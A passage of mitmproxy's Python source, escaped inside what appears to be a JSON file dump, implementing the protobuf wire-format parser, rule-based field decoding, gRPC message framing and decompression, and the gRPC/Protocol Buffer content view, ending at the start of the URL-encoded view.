list[ProtoParser.Field] = []\n        pos = 0\n        while pos < len(wire_data):\n            # read field key (tag and wire_type)\n            offset, key = ProtoParser._read_base128le(wire_data[pos:])\n            # casting raises exception for invalid WireTypes\n            wt = ProtoParser.WireTypes(key & 7)\n            tag = key >> 3\n            pos += offset\n\n            val: bytes | int\n            preferred_decoding: ProtoParser.DecodedTypes\n            if wt == ProtoParser.WireTypes.varint:\n                offset, val = ProtoParser._read_base128le(wire_data[pos:])\n                pos += offset\n                bl = val.bit_length()\n                if bl > 64:\n                    preferred_decoding = ProtoParser.DecodedTypes.unknown\n                if bl > 32:\n                    preferred_decoding = ProtoParser.DecodedTypes.uint64\n                else:\n                    preferred_decoding = ProtoParser.DecodedTypes.uint32\n            elif wt == ProtoParser.WireTypes.bit_64:\n                offset, val = ProtoParser._read_u64(wire_data[pos:])\n                pos += offset\n                preferred_decoding = ProtoParser.DecodedTypes.fixed64\n            elif wt == ProtoParser.WireTypes.len_delimited:\n                offset, length = ProtoParser._read_base128le(wire_data[pos:])\n                pos += offset\n                if length > len(wire_data[pos:]):\n                    raise ValueError(\"length delimited field exceeds data size\")\n                val = wire_data[pos : pos + length]\n                pos += length\n                preferred_decoding = ProtoParser.DecodedTypes.message\n            elif (\n                wt == ProtoParser.WireTypes.group_start\n                or wt == ProtoParser.WireTypes.group_end\n            ):\n                raise ValueError(f\"deprecated field: {wt}\")\n            elif wt == ProtoParser.WireTypes.bit_32:\n                offset, val = ProtoParser._read_u32(wire_data[pos:])\n                pos += offset\n                preferred_decoding = ProtoParser.DecodedTypes.fixed32\n            else:\n                # not reachable as if-else statements contain all possible WireTypes\n                # wrong types raise Exception during typecasting in `wt = ProtoParser.WireTypes((key & 7))`\n                raise ValueError(\"invalid WireType for protobuf messsage field\")\n\n            field = ProtoParser.Field(\n                wire_type=wt,\n                preferred_decoding=preferred_decoding,\n                options=options,\n                rules=rules,\n                tag=tag,\n                wire_value=val,\n                parent_field=parent_field,\n            )\n            res.append(field)\n\n        return res\n\n    @staticmethod\n    def read_packed_fields(\n        packed_field: ProtoParser.Field,\n    ) -> list[ProtoParser.Field]:\n        if not isinstance(packed_field.wire_value, bytes):\n            raise ValueError(\n                f\"can not unpack field with data other than bytes: {type(packed_field.wire_value)}\"\n            )\n        wire_data: bytes = packed_field.wire_value\n        tag: int = packed_field.tag\n        options: ProtoParser.ParserOptions = packed_field.options\n        rules: list[ProtoParser.ParserRule] = packed_field.rules\n        intended_decoding: ProtoParser.DecodedTypes = packed_field.preferred_decoding\n\n        # the packed field has to have WireType length delimited, whereas the contained\n        # individual types have to have a different WireType, which is derived from\n        # the intended decoding\n        if (\n            packed_field.wire_type != ProtoParser.WireTypes.len_delimited\n            or not isinstance(packed_field.wire_value, bytes)\n        ):\n            raise ValueError(\n                \"packed fields have to be embedded in a length delimited message\"\n            )\n        # wiretype to read has to be determined from intended decoding\n        packed_wire_type: ProtoParser.WireTypes\n        if (\n            intended_decoding == ProtoParser.DecodedTypes.int32\n            or intended_decoding == ProtoParser.DecodedTypes.int64\n            or intended_decoding == ProtoParser.DecodedTypes.uint32\n            or intended_decoding == ProtoParser.DecodedTypes.uint64\n            or intended_decoding == ProtoParser.DecodedTypes.sint32\n            or intended_decoding == ProtoParser.DecodedTypes.sint64\n            or intended_decoding == ProtoParser.DecodedTypes.bool\n            or intended_decoding == ProtoParser.DecodedTypes.enum\n        ):\n            packed_wire_type = ProtoParser.WireTypes.varint\n        elif (\n            intended_decoding == ProtoParser.DecodedTypes.fixed32\n            or intended_decoding == ProtoParser.DecodedTypes.sfixed32\n            or intended_decoding == ProtoParser.DecodedTypes.float\n        ):\n            packed_wire_type = ProtoParser.WireTypes.bit_32\n        elif (\n            intended_decoding == ProtoParser.DecodedTypes.fixed64\n            or intended_decoding == ProtoParser.DecodedTypes.sfixed64\n            or intended_decoding == ProtoParser.DecodedTypes.double\n        ):\n            packed_wire_type = ProtoParser.WireTypes.bit_64\n        elif (\n            intended_decoding == ProtoParser.DecodedTypes.string\n            or intended_decoding == ProtoParser.DecodedTypes.bytes\n            or intended_decoding == ProtoParser.DecodedTypes.message\n        ):\n            packed_wire_type = ProtoParser.WireTypes.len_delimited\n        else:\n            # should never happen, no test\n            raise TypeError(\n                \"Wire type could not be determined from packed decoding type\"\n            )\n\n        res: list[ProtoParser.Field] = []\n        pos = 0\n        val: bytes | int\n        if packed_wire_type == ProtoParser.WireTypes.varint:\n            while pos < len(wire_data):\n                offset, val = ProtoParser._read_base128le(wire_data[pos:])\n                pos += offset\n                res.append(\n                    ProtoParser.Field(\n                        options=options,\n                        preferred_decoding=intended_decoding,\n                        rules=rules,\n                        tag=tag,\n                        wire_type=packed_wire_type,\n                        wire_value=val,\n                        parent_field=packed_field.parent_field,\n                        is_unpacked_children=True,\n                    )\n                )\n        elif packed_wire_type == ProtoParser.WireTypes.bit_64:\n            if len(wire_data) % 8 != 0:\n                raise ValueError(\"can not parse as packed bit64\")\n            while pos < len(wire_data):\n                offset, val = ProtoParser._read_u64(wire_data[pos:])\n                pos += offset\n                res.append(\n                    ProtoParser.Field(\n                        options=options,\n                        preferred_decoding=intended_decoding,\n                        rules=rules,\n                        tag=tag,\n                        wire_type=packed_wire_type,\n                        wire_value=val,\n                        parent_field=packed_field.parent_field,\n                        is_unpacked_children=True,\n                    )\n                )\n        elif packed_wire_type == ProtoParser.WireTypes.len_delimited:\n            while pos < len(wire_data):\n                offset, length = ProtoParser._read_base128le(wire_data[pos:])\n                pos += offset\n                val = wire_data[pos : pos + length]\n                if length > len(wire_data[pos:]):\n                    raise ValueError(\"packed length delimited field exceeds data size\")\n                res.append(\n                    ProtoParser.Field(\n                        options=options,\n                        preferred_decoding=intended_decoding,\n                        rules=rules,\n                        tag=tag,\n                        wire_type=packed_wire_type,\n                        wire_value=val,\n                        parent_field=packed_field.parent_field,\n                        is_unpacked_children=True,\n                    )\n                )\n                pos += length\n        elif (\n            packed_wire_type == ProtoParser.WireTypes.group_start\n            or packed_wire_type == ProtoParser.WireTypes.group_end\n        ):\n            raise ValueError(\"group tags can not be encoded packed\")\n        elif packed_wire_type == ProtoParser.WireTypes.bit_32:\n            if len(wire_data) % 4 != 0:\n                raise ValueError(\"can not parse as packed bit32\")\n            while pos < len(wire_data):\n                offset, val = ProtoParser._read_u32(wire_data[pos:])\n                pos += offset\n                res.append(\n                    ProtoParser.Field(\n                        options=options,\n                        preferred_decoding=intended_decoding,\n                        rules=rules,\n                        tag=tag,\n                        wire_type=packed_wire_type,\n                        wire_value=val,\n                        parent_field=packed_field.parent_field,\n                        is_unpacked_children=True,\n                    )\n                )\n        else:\n            # should never happen\n            raise ValueError(\"invalid WireType for protobuf messsage field\")\n\n        # mark parent field as packed parent (if we got here, unpacking succeeded)\n        packed_field.is_packed_parent = True\n        return res\n\n    class Field:\n        \"\"\"\n        Represents a single field of a protobuf message and handles the varios encodings.\n\n        As mitmproxy sees the data passing by as raw protobuf message, it only knows the\n        WireTypes. Each of the WireTypes could represent different Protobuf field types.\n        The exact Protobuf field type can not be determined from the wire format, thus different\n        options for decoding have to be supported.\n        In addition the parsed WireTypes are (intermediary) stored in Python types, which adds\n        some additional overhead type conversions.\n\n        WireType            represented Protobuf Types                 Python type (intermediary)\n\n        0: varint           int32, int64, uint32, uint64, enum,        int (*)\n                            sint32, sint64 (both ZigZag encoded),      int\n                            bool                                       bool\n                                                                       float (**)\n\n        1: bit_64           fixed64, sfixed64,                         int (*)\n                            double                                     float\n\n        2: len_delimited    string,                                    str\n                            message,                                   class 'Message'\n                            bytes,                                     bytes (*)\n                            packed_repeated_field                      class 'Message' (fields with same tag)\n\n        3: group_start      unused (deprecated)                        -\n        4: group_end        unused (deprecated)                        -\n\n        5: bit_32           fixed32, sfixed32,                         int (*)\n                            float                                      float\n\n        (*) Note 1:  Conversion between WireType and intermediary python representation\n                     is handled by Kaitai protobuf decoder and always uses the python\n                     representation marked with (*). Converting to alternative representations\n                     is handled inside this class.\n        (**) Note 2: Varint is not used to represent floating point values, but some applications\n                     store native floats in uint32 protobuf types (or native double in uint64).\n                     Thus we allow conversion of varint to floating point values for convenience\n                     (A well known APIs \"hide\" GPS latitude and longitude values in varint types,\n                     much easier to spot such things when rendered as float)\n\n        Ref: - https://developers.google.com/protocol-buffers/docs/proto3\n             - https://developers.google.com/protocol-buffers/docs/encoding\n        \"\"\"\n\n        def __init__(\n            self,\n            wire_type: ProtoParser.WireTypes,\n            preferred_decoding: ProtoParser.DecodedTypes,\n            tag: int,\n            parent_field: ProtoParser.Field | None,\n            wire_value: int | bytes,\n            options: ProtoParser.ParserOptions,\n            rules: list[ProtoParser.ParserRule],\n            is_unpacked_children: bool = False,\n        ) -> None:\n            self.wire_type: ProtoParser.WireTypes = wire_type\n            self.preferred_decoding: ProtoParser.DecodedTypes = preferred_decoding\n            self.wire_value: int | bytes = wire_value\n            self.tag: int = tag\n            self.options: ProtoParser.ParserOptions = options\n            self.name: str = \"\"\n            self.rules: list[ProtoParser.ParserRule] = rules\n            self.parent_field: ProtoParser.Field | None = parent_field\n            self.is_unpacked_children: bool = (\n                is_unpacked_children  # marks field as being a result of unpacking\n            )\n            self.is_packed_parent: bool = (\n                False  # marks field as being parent of successfully unpacked children\n            )\n            self.parent_tags: list[int] = []\n            if self.parent_field is not None:\n                self.parent_tags = self.parent_field.parent_tags[:]\n                self.parent_tags.append(self.parent_field.tag)\n            self.try_unpack = False\n\n            # rules can overwrite self.try_unpack\n            self.apply_rules()\n            # do not unpack fields which are the result of unpacking\n            if parent_field is not None and self.is_unpacked_children:\n                self.try_unpack = False\n\n        # no tests for only_first_hit=False, as not user-changable\n        def apply_rules(self, only_first_hit=True):\n            tag_str = self._gen_tag_str()\n            name = None\n            decoding = None\n            as_packed = False\n            try:\n                for rule in self.rules:\n                    for fd in rule.field_definitions:\n                        match = False\n                        if len(fd.tag_prefixes) == 0 and fd.tag == tag_str:\n                            match = True\n                        else:\n                            for rt in fd.tag_prefixes:\n                                if rt + fd.tag == tag_str:\n                                    match = True\n                                    break\n                        if match:\n                            if only_first_hit:\n                                # only first match\n                                if fd.name is not None:\n                                    self.name = fd.name\n                                if fd.intended_decoding is not None:\n                                    self.preferred_decoding = fd.intended_decoding\n                                self.try_unpack = bool(fd.as_packed)\n                                return\n                            else:\n                                # overwrite matches till last rule was inspected\n                                # (f.e. allows to define name in one rule and intended_decoding in another one)\n                                name = fd.name if fd.name else name\n                                decoding = (\n                                    fd.intended_decoding\n                                    if fd.intended_decoding\n                                    else decoding\n                                )\n                                if fd.as_packed:\n                                    as_packed = True\n\n                if name:\n                    self.name = name\n                if decoding:\n                    self.preferred_decoding = decoding\n                self.try_unpack = as_packed\n            except Exception as e:\n                logging.warning(e)\n\n        def _gen_tag_str(self):\n            tags = self.parent_tags[:]\n            tags.append(self.tag)\n            return \".\".join([str(tag) for tag in tags])\n\n        def safe_decode_as(\n            self,\n            intended_decoding: ProtoParser.DecodedTypes,\n            try_as_packed: bool = False,\n        ) -> tuple[\n            ProtoParser.DecodedTypes,\n            bool | float | int | bytes | str | list[ProtoParser.Field],\n        ]:\n            \"\"\"\n            Tries to decode as intended, applies failover, if not possible\n\n            Returns selected decoding and decoded value\n            \"\"\"\n            if self.wire_type == ProtoParser.WireTypes.varint:\n                try:\n                    return intended_decoding, self.decode_as(\n                        intended_decoding, try_as_packed\n                    )\n                except Exception:\n                    if int(self.wire_value).bit_length() > 32:\n                        # ignore the fact that varint could exceed 64bit (would violate the specs)\n                        return ProtoParser.DecodedTypes.uint64, self.wire_value\n                    else:\n                        return ProtoParser.DecodedTypes.uint32, self.wire_value\n            elif self.wire_type == ProtoParser.WireTypes.bit_64:\n                try:\n                    return intended_decoding, self.decode_as(\n                        intended_decoding, try_as_packed\n                    )\n                except Exception:\n                    return ProtoParser.DecodedTypes.fixed64, self.wire_value\n            elif self.wire_type == ProtoParser.WireTypes.bit_32:\n                try:\n                    return intended_decoding, self.decode_as(\n                        intended_decoding, try_as_packed\n                    )\n                except Exception:\n                    return ProtoParser.DecodedTypes.fixed32, self.wire_value\n            elif self.wire_type == ProtoParser.WireTypes.len_delimited:\n                try:\n                    return intended_decoding, self.decode_as(\n                        intended_decoding, try_as_packed\n                    )\n                except Exception:\n                    # failover strategy: message --> string (valid UTF-8) --> bytes\n                    len_delimited_strategy: list[ProtoParser.DecodedTypes] = [\n                        ProtoParser.DecodedTypes.message,\n                        ProtoParser.DecodedTypes.string,\n                        ProtoParser.DecodedTypes.bytes,  # should always work\n                    ]\n                    for failover_decoding in len_delimited_strategy:\n                        if failover_decoding == intended_decoding and not try_as_packed:\n                            # don't try same decoding twice, unless first attempt was packed\n                            continue\n                        try:\n                            return failover_decoding, self.decode_as(\n                                failover_decoding, False\n                            )\n                        except Exception:\n                            pass\n\n            # we should never get here (could not be added to tests)\n            return ProtoParser.DecodedTypes.unknown, self.wire_value\n\n        def decode_as(\n            self, intended_decoding: ProtoParser.DecodedTypes, as_packed: bool = False\n        ) -> bool | int | float | bytes | str | list[ProtoParser.Field]:\n            if as_packed is True:\n                return ProtoParser.read_packed_fields(packed_field=self)\n\n            if self.wire_type == ProtoParser.WireTypes.varint:\n                assert isinstance(self.wire_value, int)\n                if intended_decoding == ProtoParser.DecodedTypes.bool:\n                    # clamp result to 64bit\n                    return self.wire_value & 0xFFFFFFFFFFFFFFFF != 0\n                elif intended_decoding == ProtoParser.DecodedTypes.int32:\n                    if self.wire_value.bit_length() > 32:\n                        raise TypeError(\"wire value too large for int32\")\n                    return struct.unpack(\"!i\", struct.pack(\"!I\", self.wire_value))[0]\n                elif intended_decoding == ProtoParser.DecodedTypes.int64:\n                    if self.wire_value.bit_length() > 64:\n                        raise TypeError(\"wire value too large for int64\")\n                    return struct.unpack(\"!q\", struct.pack(\"!Q\", self.wire_value))[0]\n                elif intended_decoding == ProtoParser.DecodedTypes.uint32:\n                    if self.wire_value.bit_length() > 32:\n                        raise TypeError(\"wire value too large for uint32\")\n                    return self.wire_value  # already 'int' which was parsed as unsigned\n                elif (\n                    intended_decoding == ProtoParser.DecodedTypes.uint64\n                    or intended_decoding == ProtoParser.DecodedTypes.enum\n                ):\n                    if self.wire_value.bit_length() > 64:\n                        raise TypeError(\"wire value too large\")\n                    return self.wire_value  # already 'int' which was parsed as unsigned\n                elif intended_decoding == ProtoParser.DecodedTypes.sint32:\n                    if self.wire_value.bit_length() > 32:\n                        raise TypeError(\"wire value too large for sint32\")\n                    return (self.wire_value >> 1) ^ -(\n                        self.wire_value & 1\n                    )  # zigzag_decode\n                elif intended_decoding == ProtoParser.DecodedTypes.sint64:\n                    if self.wire_value.bit_length() > 64:\n                        raise TypeError(\"wire value too large for sint64\")\n                    # ZigZag decode\n                    # Ref: https://gist.github.com/mfuerstenau/ba870a29e16536fdbaba\n                    return (self.wire_value >> 1) ^ -(self.wire_value & 1)\n                elif (\n                    intended_decoding == ProtoParser.DecodedTypes.float\n                    or intended_decoding == ProtoParser.DecodedTypes.double\n                ):\n                    # special case, not complying to protobuf specs\n                    return self._wire_value_as_float()\n            elif self.wire_type == ProtoParser.WireTypes.bit_64:\n                if intended_decoding == ProtoParser.DecodedTypes.fixed64:\n                    return self.wire_value\n                elif intended_decoding == ProtoParser.DecodedTypes.sfixed64:\n                    return struct.unpack(\"!q\", struct.pack(\"!Q\", self.wire_value))[0]\n                elif intended_decoding == ProtoParser.DecodedTypes.double:\n                    return self._wire_value_as_float()\n            elif self.wire_type == ProtoParser.WireTypes.bit_32:\n                if intended_decoding == ProtoParser.DecodedTypes.fixed32:\n                    return self.wire_value\n                elif intended_decoding == ProtoParser.DecodedTypes.sfixed32:\n                    return struct.unpack(\"!i\", struct.pack(\"!I\", self.wire_value))[0]\n                elif intended_decoding == ProtoParser.DecodedTypes.float:\n                    return self._wire_value_as_float()\n            elif self.wire_type == ProtoParser.WireTypes.len_delimited:\n                assert isinstance(self.wire_value, bytes)\n                if intended_decoding == ProtoParser.DecodedTypes.string:\n                    # According to specs, a protobuf string HAS TO be UTF-8 parsable\n                    # throw exception on invalid UTF-8 chars, but escape linebreaks\n                    return self.wire_value_as_utf8(escape_newline=True)\n                elif intended_decoding == ProtoParser.DecodedTypes.bytes:\n                    # always works, assure to hand back a copy\n                    return self.wire_value[:]\n                elif intended_decoding == ProtoParser.DecodedTypes.message:\n                    return ProtoParser.read_fields(\n                        wire_data=self.wire_value,\n                        parent_field=self,\n                        options=self.options,\n                        rules=self.rules,\n                    )\n\n            # if here, there is no valid decoding\n            raise TypeError(\"intended decoding mismatches wire type\")\n\n        def encode_from(inputval, intended_encoding: ProtoParser.DecodedTypes):\n            raise NotImplementedError(\n                \"Future work, needed to manipulate and re-encode protobuf message, with respect to given wire types\"\n            )\n\n        def _wire_value_as_float(self) -> float:\n            \"\"\"\n            Handles double (64bit) and float (32bit).\n            Assumes Network Byte Order (big endian).\n\n            Usable for:\n\n               WireType --> Protobuf Type):\n               ----------------------------\n               varint        --> double/float (not intended by ProtoBuf, but used in the wild)\n               bit_32        --> float\n               bit_64        --> double\n               len_delimited --> 4 bytes: float / 8 bytes: double / other sizes return NaN\n            \"\"\"\n            v = self._value_as_bytes()\n            if len(v) == 4:\n                return struct.unpack(\"!f\", v)[0]\n            elif len(v) == 8:\n                return struct.unpack(\"!d\", v)[0]\n            # no need to raise an Exception\n            raise TypeError(\"can not be converted to floatingpoint representation\")\n\n        def _value_as_bytes(self) -> bytes:\n            if isinstance(self.wire_value, bytes):\n                return self.wire_value\n            elif isinstance(self.wire_value, int):\n                if self.wire_value.bit_length() > 64:\n                    # source for a python int are wiretypes varint/bit_32/bit64 and should never convert to int values 64bit\n                    # currently avoided by kaitai decoder (can not be added to tests)\n                    raise ValueError(\"value exceeds 64bit, violating protobuf specs\")\n                elif self.wire_value.bit_length() > 32:\n                    # packing uses network byte order (to assure consistent results across architectures)\n                    return struct.pack(\"!Q\", self.wire_value)\n                else:\n                    # packing uses network byte order (to assure consistent results across architectures)\n                    return struct.pack(\"!I\", self.wire_value)\n            else:\n                # should never happen, no tests\n                raise ValueError(\"can not be converted to bytes\")\n\n        def _wire_type_str(self):\n            return str(self.wire_type).split(\".\")[-1]\n\n        def _decoding_str(self, decoding: ProtoParser.DecodedTypes):\n            return str(decoding).split(\".\")[-1]\n\n        def wire_value_as_utf8(self, escape_newline=True) -> str:\n            if isinstance(self.wire_value, bytes):\n                res = self.wire_value.decode(\"utf-8\")\n                return res.replace(\"\\n\", \"\\\\n\") if escape_newline else res\n            return str(self.wire_value)\n\n        def gen_flat_decoded_field_dicts(self) -> Generator[dict, None, None]:\n            \"\"\"\n            Returns a generator which passes the field as a dict.\n\n            In order to return the field value it gets decoded (based on a failover strategy and\n            provided ParserRules).\n            If the field holds a nested message, the fields contained in the message are appended.\n            Ultimately this flattens all fields recursively.\n            \"\"\"\n            selected_decoding, decoded_val = self.safe_decode_as(\n                self.preferred_decoding, self.try_unpack\n            )\n            field_desc_dict = {\n                \"tag\": self._gen_tag_str(),\n                \"wireType\": self._wire_type_str(),\n                \"decoding\": self._decoding_str(selected_decoding),\n                \"name\": self.name,\n            }\n            if isinstance(decoded_val, list):\n                if (\n                    selected_decoding\n                    == ProtoParser.DecodedTypes.message  # field is a message with subfields\n                    and not self.is_packed_parent  # field is a message, but replaced by packed fields\n                ):\n                    # Field is a message, not packed, thus include it as message header\n                    field_desc_dict[\"val\"] = \"\"\n                    yield field_desc_dict\n                # add sub-fields of messages or packed fields\n                for f in decoded_val:\n                    yield from f.gen_flat_decoded_field_dicts()\n            else:\n                field_desc_dict[\"val\"] = decoded_val\n                yield field_desc_dict\n\n    def __init__(\n        self,\n        data: bytes,\n        rules: list[ProtoParser.ParserRule] | None = None,\n        parser_options: ParserOptions | None = None,\n    ) -> None:\n        self.data: bytes = data\n        if parser_options is None:\n            parser_options = ProtoParser.ParserOptions()\n        self.options = parser_options\n        if rules is None:\n            rules = []\n        self.rules = rules\n\n        try:\n            self.root_fields: list[ProtoParser.Field] = ProtoParser.read_fields(\n                wire_data=self.data,\n                options=self.options,\n                parent_field=None,\n                rules=self.rules,\n            )\n        except Exception as e:\n            raise ValueError(\"not a valid protobuf message\") from e\n\n    def gen_flat_decoded_field_dicts(self) -> Generator[dict, None, None]:\n        for f in self.root_fields:\n            yield from f.gen_flat_decoded_field_dicts()\n\n    def gen_str_rows(self) -> Generator[tuple[str, ...], None, None]:\n        for field_dict in self.gen_flat_decoded_field_dicts():\n            if (\n                self.options.exclude_message_headers\n                and field_dict[\"decoding\"] == \"message\"\n            ):\n                continue\n\n            if self.options.include_wiretype:\n                col1 = \"[{}->{}]\".format(field_dict[\"wireType\"], field_dict[\"decoding\"])\n            else:\n                col1 = \"[{}]\".format(field_dict[\"decoding\"])\n            col2 = field_dict[\"name\"]  # empty string if not set (consumes no space)\n            col3 = field_dict[\"tag\"]\n            col4 = str(field_dict[\"val\"])\n            yield col1, col2, col3, col4\n\n\n# Note: all content view formating functionality is kept out of the ProtoParser class, to\n#       allow it to be use independently.\n#       This function is generic enough, to consider moving it to mitmproxy.contentviews.base\ndef format_table(\n    table_rows: Iterable[tuple[str, ...]],\n    max_col_width=100,\n) -> Iterator[base.TViewLine]:\n    \"\"\"\n    Helper function to render tables with variable column count (move to contentview base, if needed elsewhere)\n\n    Note: The function has to convert generators to a list, as all rows have to be processed twice (to determine\n    the column widths first).\n    \"\"\"\n    rows: list[tuple[str, ...]] = []\n    col_count = 0\n    cols_width: list[int] = []\n    for row in table_rows:\n        col_count = max(col_count, len(row))\n        while len(cols_width) < col_count:\n            cols_width.append(0)\n        for col_num in range(len(row)):\n            cols_width[col_num] = max(len(row[col_num]), cols_width[col_num])\n\n        # store row in list\n        rows.append(row)\n\n    for i in range(len(cols_width)):\n        cols_width[i] = min(cols_width[i], max_col_width)\n\n    for row in rows:\n        line: base.TViewLine = []\n        for col_num in range(len(row)):\n            col_val = row[col_num].ljust(cols_width[col_num] + 2)\n            line.append((\"text\", col_val))\n        yield line\n\n\ndef parse_grpc_messages(\n    data, compression_scheme\n) -> Generator[tuple[bool, bytes], None, None]:\n    \"\"\"Generator iterates over body data and returns a boolean indicating if the messages\n    was compressed, along with the raw message data (decompressed) for each gRPC message\n    contained in the body data\"\"\"\n    while data:\n        try:\n            msg_is_compressed, length = struct.unpack(\"!?i\", data[:5])\n            decoded_message = struct.unpack(\"!%is\" % length, data[5 : 5 + length])[0]\n        except Exception as e:\n            raise ValueError(\"invalid gRPC message\") from e\n\n        if msg_is_compressed:\n            try:\n                decoded_message = decode(\n                    encoded=decoded_message, encoding=compression_scheme\n                )\n            except Exception as e:\n                raise ValueError(\"Failed to decompress gRPC message with gzip\") from e\n\n        yield msg_is_compressed, decoded_message\n        data = data[5 + length :]\n\n\n# hacky fix for mitmproxy issue:\n#\n# mitmproxy handles Exceptions in the contenview's __call__ function, by\n# failing over to 'Raw' view. The intention was to use this behavior to\n# pass up Exceptions thrown inside the generator function ('format_pbuf'\n# and 'format_grpc') to the __call__ function.\n# This usually works fine if the contentview is initialized on a flow\n# with invalid data.\n# When the flow data gets invalidated in the edit mode, mitmproxy re-calls\n# the generator functions outside the contentviews '__call__' method.\n#\n# This happens in the 'safe_to_print' function of 'mitmproxy/contentvies/__init__.py'\n#\n#  def safe_to_print(lines, encoding=\"utf8\"):\n#    \"\"\"\n#    Wraps a content generator so that each text portion is a *safe to print* unicode string.\n#    \"\"\"\n#    for line in lines:  # <------ this code re-iterates lines and thus calls generators, without using the views __call__ function\n#        clean_line = []\n#        for (style, text) in line:\n#            if isinstance(text, bytes):\n#                text = text.decode(encoding, \"replace\")\n#            text = strutils.escape_control_characters(text)\n#            clean_line.append((style, text))\n#        yield clean_line\n#\n# In result, mitmproxy crashes if the generator functions raise Exception to indicate\n# data parsing errors.\n# To deal with this, the generator function gets converted into a list inside the\n# __call__ function. Ultimately, exceptions are raised directly from within __call__\n# instead in cases where the generator is accessed externally without exception handling.\ndef hack_generator_to_list(generator_func):\n    return list(generator_func)\n\n\ndef format_pbuf(\n    message: bytes,\n    parser_options: ProtoParser.ParserOptions,\n    rules: list[ProtoParser.ParserRule],\n):\n    yield from format_table(\n        ProtoParser(\n            data=message, parser_options=parser_options, rules=rules\n        ).gen_str_rows()\n    )\n\n\ndef format_grpc(\n    data: bytes,\n    parser_options: ProtoParser.ParserOptions,\n    rules: list[ProtoParser.ParserRule],\n    compression_scheme=\"gzip\",\n):\n    message_count = 0\n    for compressed, pb_message in parse_grpc_messages(\n        data=data, compression_scheme=compression_scheme\n    ):\n        headline = (\n            \"gRPC message \"\n            + str(message_count)\n            + \" (compressed \"\n            + str(compression_scheme if compressed else compressed)\n            + \")\"\n        )\n\n        yield [(\"text\", headline)]\n        yield from format_pbuf(\n            message=pb_message, parser_options=parser_options, rules=rules\n        )\n\n\n@dataclass\nclass ViewConfig:\n    parser_options: ProtoParser.ParserOptions = field(\n        default_factory=ProtoParser.ParserOptions\n    )\n    parser_rules: list[ProtoParser.ParserRule] = field(default_factory=list)\n\n\nclass ViewGrpcProtobuf(base.View):\n    \"\"\"Human friendly view of protocol buffers\"\"\"\n\n    name = \"gRPC/Protocol Buffer\"\n    __content_types_pb = [\n        \"application/x-protobuf\",\n        \"application/x-protobuffer\",\n        \"application/grpc-proto\",\n    ]\n    __content_types_grpc = [\n        \"application/grpc\",\n        # seems specific to chromium infra tooling\n        # https://chromium.googlesource.com/infra/luci/luci-go/+/refs/heads/main/grpc/prpc/\n        \"application/prpc\",\n    ]\n\n    # first value serves as default algorithm for compressed messages, if 'grpc-encoding' header is missing\n    __valid_grpc_encodings = [\n        \"gzip\",\n        \"identity\",\n        \"deflate\",\n        \"zstd\",\n    ]\n\n    # allows to take external ParserOptions object. goes with defaults otherwise\n    def __init__(self, config: ViewConfig | None = None) -> None:\n        super().__init__()\n        if config is None:\n            config = ViewConfig()\n        self.config = config\n\n    def _matching_rules(\n        self,\n        rules: list[ProtoParser.ParserRule],\n        message: http.Message | None,\n        flow: flow.Flow | None,\n    ) -> list[ProtoParser.ParserRule]:\n        \"\"\"\n        Checks which of the give rules applies and returns a List only containing those rules\n\n        Each rule defines a flow filter in rule.filter which is usually matched against a flow.\n        When it comes to protobuf parsing, in most cases request messages differ from response messages.\n        Thus, it has to be possible to apply a rule to a http.Request or a http.Response, only.\n\n        As the name flowfilter suggests, filters are working on a flow-level, not on message-level.\n        This means:\n\n        - the filter expression '~q' matches all flows with a request, but no response\n        - the filter expression '~s' matches all flows with a response\n\n        In result, for complete flows (with a gRPC message in the request and the response), ParserRules would\n        either be applied to request and response at the same time ('~s') or neither would match request, nor\n        response (~q).\n\n        To distinguish between rules which should be applied to response messages, request messages or both\n        (while being applied to the whole flow), different classes with same behavior are used to wrap rules:\n\n            - ParserRule: applies to requests and responses\n            - ParserRuleRequest: applies to requests only\n            - ParserRuleResponse: applies to responses only\n        \"\"\"\n        res: list[ProtoParser.ParserRule] = []\n        if not flow:\n            return res\n        is_request = isinstance(message, http.Request)\n        for rule in rules:\n            # message based rule matching\n            if is_request and isinstance(rule, ProtoParser.ParserRuleResponse):\n                continue\n            elif not is_request and isinstance(rule, ProtoParser.ParserRuleRequest):\n                continue\n            # flow based rule matching\n            if flowfilter.match(rule.filter, flow=flow):\n                res.append(rule)\n        return res\n\n    def __call__(\n        self,\n        data: bytes,\n        *,\n        content_type: str | None = None,\n        flow: flow.Flow | None = None,\n        http_message: http.Message | None = None,\n        **unknown_metadata,\n    ) -> contentviews.TViewResult:\n        applicabble_rules = self._matching_rules(\n            rules=self.config.parser_rules, flow=flow, message=http_message\n        )\n        if content_type in self.__content_types_grpc:\n            # If gRPC messages are flagged to be compressed, the compression algorithm is expressed in the\n            # 'grpc-encoding' header.\n            #\n            # The following code tries to determine the compression algorithm base on this header.\n            # If the header is not present or contains an unsupported compression, the logic falls back to\n            # 'gzip'.\n            #\n            # If a compressed gRPC message is found in the body data (compressed flag set), the information\n            # on the compression scheme is needed (even if not set by a header), in order to process the message.\n            # Thus we assure there is always an encoding selected. An encoding of 'Identity' would not make\n            # sense, if a message is flagged as being compressed, that's why a default is chosen.\n            try:\n                assert http_message is not None\n                h = http_message.headers[\"grpc-encoding\"]\n                grpc_encoding = (\n                    h\n                    if h in self.__valid_grpc_encodings\n                    else self.__valid_grpc_encodings[0]\n                )\n            except Exception:\n                grpc_encoding = self.__valid_grpc_encodings[0]\n\n            text_iter = format_grpc(\n                data=data,\n                parser_options=self.config.parser_options,\n                compression_scheme=grpc_encoding,\n                rules=applicabble_rules,\n            )\n            title = \"gRPC\"\n        else:\n            text_iter = format_pbuf(\n                message=data,\n                parser_options=self.config.parser_options,\n                rules=applicabble_rules,\n            )\n            title = \"Protobuf (flattened)\"\n\n        # hacky bugfix, see description above generator functions format_pbuf/format_grpc\n        try:\n            text_iter = hack_generator_to_list(text_iter)\n        except Exception as e:\n            # hook to log exception tracebacks on iterators\n\n            # import traceback\n            # logging.warning(\"gRPC contentview: {}\".format(traceback.format_exc()))\n            raise e\n\n        return title, text_iter\n\n    def render_priority(\n        self,\n        data: bytes,\n        *,\n        content_type: str | None = None,\n        flow: flow.Flow | None = None,\n        http_message: http.Message | None = None,\n        **unknown_metadata,\n    ) -> float:\n        if bool(data) and content_type in self.__content_types_grpc:\n            return 1\n        if bool(data) and content_type in self.__content_types_pb:\n            # replace existing protobuf renderer preference (adjust by option)\n            return 1.5\n        else:\n            return 0\n", "mitmproxy/contentviews/urlencoded.py": "from . import base\nfrom mitmproxy.net.http import url\n\n\nclass ViewURLEncoded(base.View):\n    name = \"URL-encoded\"\n\n    def __call__(self, data, **metadata):\n        try:\n            data = data.decode(\"ascii\", \"strict\")\n        except ValueError:\n            return None\n        d = 